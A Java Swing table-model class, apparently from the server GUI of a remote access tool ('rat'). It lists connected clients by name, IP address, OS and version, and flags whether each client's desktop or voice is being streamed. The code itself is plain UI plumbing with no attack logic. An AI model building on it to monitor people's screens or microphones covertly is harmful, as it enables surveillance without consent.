package de.sogomn.rat.server.gui;

import java.util.ArrayList;
import java.util.function.Function;

import javax.swing.table.AbstractTableModel;

import de.sogomn.rat.server.ServerClient;

final class ServerClientTableModel extends AbstractTableModel {
	private static final long serialVersionUID = 919111102883611810L;
	
	private ArrayList<ServerClient> serverClients;
	private Column[] columns;
	
	private static final int COLUMN_COUNT = 6;
	
	public ServerClientTableModel() {
		serverClients = new ArrayList<ServerClient>();
		columns = new Column[COLUMN_COUNT];
		
		columns[0] = new Column("Name", String.class, ServerClient::getName);
		columns[1] = new Column("IP address", String.class, ServerClient::getAddress);
		columns[2] = new Column("OS", String.class, ServerClient::getOs);
		columns[3] = new Column("Version", String.class, ServerClient::getVersion);
		columns[4] = new Column("Streaming desktop", Boolean.class, ServerClient::isStreamingDesktop);
		columns[5] = new Column("Streaming voice", Boolean.class, ServerClient::isStreamingVoice);
	}
	
	@Override
	public String getColumnName(final int columnIndex) {
		if (columnIndex <= COLUMN_COUNT - 1 && columnIndex >= 0) {
			final Column column = columns[columnIndex];
			
			return column.name;
		}
		
		return super.getColumnName(columnIndex);
	}
	
	@Override
	public Class<?> getColumnClass(final int columnIndex) {
		if (columnIndex <= COLUMN_COUNT - 1 && columnIndex >= 0) {
			final Column column = columns[columnIndex];
			
			return column.clazz;
		}
		
		return super.getColumnClass(columnIndex);
	}
	
	@Override
	public boolean isCellEditable(final int rowIndex, final int columnIndex) {
		return false;
	}
	
	@Override
	public Object getValueAt(final int rowIndex, final int columnIndex) {
		final ServerClient serverClient = getServerClient(rowIndex);
		
		if (serverClient == null || columnIndex > COLUMN_COUNT - 1 || columnIndex < 0) {
			return null;
		}
		
		final Column column = columns[columnIndex];
		final Function<ServerClient, ?> value = column.value;
		
		return value.apply(serverClient);
	}
	
	@Override
	public int getColumnCount() {
		return COLUMN_COUNT;
	}
	
	@Override
	public int getRowCount() {
		return serverClients.size();
	}
	
	public void addServerClient(final ServerClient client) {
		serverClients.add(client);
		fireTableDataChanged();
	}
	
	public void removeServerClient(final ServerClient client) {
		serverClients.remove(client);
		fireTableDataChanged();
	}
	
	public ServerClient getServerClient(final int rowIndex) {
		if (rowIndex <= serverClients.size() - 1 && rowIndex >= 0) {
			return serverClients.get(rowIndex);
		}
		
		return null;
	}
	
	private final class Column {
		
		final String name;
		final Class<?> clazz;
		final Function<ServerClient, ?> value;
		
		public Column(final String name, final Class<?> clazz, final Function<ServerClient, ?> value) {
			this.name = name;
			this.clazz = clazz;
			this.value = value;
		}
		
	}
	
}
